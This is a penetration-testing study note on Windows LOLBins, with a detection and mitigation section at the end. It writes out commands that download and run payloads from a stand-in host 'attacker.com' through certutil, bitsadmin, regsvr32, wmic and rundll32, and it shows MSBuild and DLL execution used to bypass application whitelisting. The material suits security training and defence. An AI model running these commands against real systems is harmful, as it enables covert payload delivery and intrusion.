---
tags: [windows, privesc, pentesting, red-team]
difficulty: advanced
module: "43 - Windows Privilege Escalation"
topic: "43.34 LOLBins"
---

# LOLBins (Living Off The Land Binaries)

## Introduction
LOLBins, short for "Living Off The Land Binaries," are legitimate, Microsoft-signed binaries that are native to the Windows operating system but can be abused by attackers to perform malicious actions. The concept of "Living Off The Land" (LOTL) involves utilizing these built-in tools to execute code, bypass security controls, maintain persistence, or exfiltrate data, thereby blending in with normal administrative traffic and evading detection mechanisms that primarily look for known malicious executables.

Because these binaries are signed by Microsoft and are often essential for normal system operation, they cannot be simply deleted or blocked by antivirus or AppLocker without causing significant disruption to the operating environment.

## Why Use LOLBins?
The primary advantage of using LOLBins is stealth. When an attacker drops a custom, unsigned executable (e.g., `malware.exe`) onto a system, it is highly likely to be flagged by Antivirus (AV), Endpoint Detection and Response (EDR) systems, or Application Whitelisting (AWL) solutions. 

By contrast, invoking a tool like `certutil.exe` or `bitsadmin.exe` does not trigger the same immediate alarm bells because administrators frequently use these tools for legitimate maintenance tasks.

## ASCII Architecture Diagram

```text
+---------------------------------------------------------------+
|                      The LOLBin Attack Flow                   |
|                                                               |
|  +-------------+       +-----------------+      +----------+  |
|  | Attacker    | ----> | Trusted LOLBin  | ---> | Malicious|  |
|  | Payload     |       | (e.g., MSBuild) |      | Action   |  |
|  +-------------+       +--------+--------+      +----------+  |
|                                 |                             |
|                                 v                             |
|                    +-------------------------+                |
|                    | OS Security Controls    |                |
|                    | (AV, EDR, AppLocker)    |                |
|                    +------------+------------+                |
|                                 |                             |
|                                 |  [Bypass!]                  |
|                                 v                             |
|                     +-----------------------+                 |
|                     | Successful Execution  |                 |
|                     | - Code Execution      |                 |
|                     | - File Download       |                 |
|                     | - UAC Bypass          |                 |
|                     +-----------------------+                 |
+---------------------------------------------------------------+
```

## Categories of LOLBins
LOLBins can be categorized based on the malicious activity they facilitate:

1.  **Code Execution:** Executing arbitrary payloads (shellcode, scripts, executables) while masking the true origin.
2.  **File Download:** Retrieving remote payloads from the internet or local network without using suspicious tools like `curl` or `wget`.
3.  **Bypass AWL (Application Whitelisting):** Evading policies set by AppLocker or Windows Defender Application Control (WDAC).
4.  **UAC Bypass:** Elevating privileges without triggering User Access Control prompts.
5.  **Persistence:** Maintaining access to the system across reboots.

## Key LOLBins and Exploitation Techniques

### 1. Certutil.exe
`certutil.exe` is a command-line program that is installed as part of Certificate Services. It is widely abused for downloading files and decoding base64 encoded payloads.

*   **File Download:**
    ```cmd
    certutil.exe -urlcache -split -f "http://attacker.com/payload.exe" "C:\temp\payload.exe"
    ```
    *This downloads the payload and saves it locally. Note that modern Defenders heavily scrutinize `certutil` with `-urlcache`.*

*   **Base64 Decoding:**
    Attackers can transfer base64 encoded payloads (to evade simple string matching) and decode them natively.
    ```cmd
    certutil.exe -decode "C:\temp\encoded.txt" "C:\temp\decoded.exe"
    ```

### 2. Bitsadmin.exe
Background Intelligent Transfer Service (BITS) is used to download files from or upload files to HTTP web servers and SMB file shares. `bitsadmin.exe` is the command-line tool to manage BITS jobs.

*   **File Download:**
    ```cmd
    bitsadmin /transfer myDownloadJob /download /priority normal "http://attacker.com/payload.exe" "C:\temp\payload.exe"
    ```

### 3. MSBuild.exe
The Microsoft Build Engine (`MSBuild.exe`) is a platform for building applications. It processes XML formatted project files. Attackers can embed malicious C# code within an MSBuild project file (`.csproj` or `.xml`) and have `MSBuild.exe` compile and execute it in memory, bypassing application whitelisting.

*   **Code Execution:**
    ```cmd
    C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\temp\malicious.xml
    ```
    *This executes the inline tasks defined within the XML file, often resulting in a reverse shell or shellcode injection.*

### 4. Regsvr32.exe
`regsvr32.exe` is a command-line utility to register and unregister OLE controls, such as DLLs and ActiveX controls. It can be abused to execute arbitrary code via COM scriptlets (`.sct` files), often referred to as the "Squiblydoo" technique.

*   **Code Execution and AppLocker Bypass:**
    ```cmd
    regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
    ```
    *The `/i` parameter points to a remote URL containing the scriptlet. The `/u` parameter unregisters the component, leaving no trace in the registry. `scrobj.dll` is the engine that executes the scriptlet.*

### 5. WMIC.exe
Windows Management Instrumentation Command-line (`WMIC.exe`) provides a command-line interface to WMI. It can be used for extensive local and remote system management, making it incredibly powerful for lateral movement and execution.

*   **Remote Execution:**
    ```cmd
    wmic /node:"192.168.1.10" process call create "cmd.exe /c calc.exe"
    ```
*   **Executing XSL files:**
    ```cmd
    wmic os get /FORMAT:"http://attacker.com/payload.xsl"
    ```

### 6. Rundll32.exe
`rundll32.exe` is used to load and run 32-bit dynamic-link libraries (DLLs). Attackers use it to execute malicious DLLs or specific exported functions.

*   **Executing a DLL:**
    ```cmd
    rundll32.exe C:\temp\malicious.dll,EntryPoint
    ```
*   **Executing JavaScript:**
    ```cmd
    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct");window.close();
    ```

## Detection and Mitigation
Detecting LOLBins is challenging because the binaries themselves are benign. Defense must focus on behavioral analytics and command-line monitoring.

1.  **Command-Line Logging:** Enable Event ID 4688 (Process Creation) and ensure command-line auditing is turned on. Monitor for known malicious arguments (e.g., `certutil -urlcache`, `regsvr32 /i:http`).
2.  **Sysmon:** Deploy Sysmon to gain deep visibility into process creation, network connections made by unusual processes, and file creation.
3.  **Parent-Child Relationships:** Monitor for anomalous process lineages. For example, `winword.exe` spawning `cmd.exe` or `powershell.exe` is highly suspicious. `msbuild.exe` making external network connections is also anomalous.
4.  **Application Whitelisting (WDAC/AppLocker):** While LOLBins bypass naive AWL, advanced configurations can restrict which specific signed binaries are allowed to execute, or block them from accessing the internet.
5.  **Behavioral EDR:** Modern Endpoint Detection and Response solutions use machine learning to baseline normal administrative behavior and alert on deviations, such as an IT admin tool being run by a standard user account.

## Chaining Opportunities
- LOLBins are frequently used immediately after initial access to establish a foothold without dropping disk-based malware.
- They are essential for bypassing [[35 - AppLocker and WDAC Bypass]].
- File download LOLBins can fetch advanced post-exploitation frameworks or tools like [[33 - NTDS.dit Extraction]] utilities.

## Related Notes
- [[10 - Windows Privilege Escalation Basics]]
- [[35 - AppLocker and WDAC Bypass]]
- [[39 - Windows Defender Evasion Basics]]
- [[38 - Event Log Clearing and Evasion]]
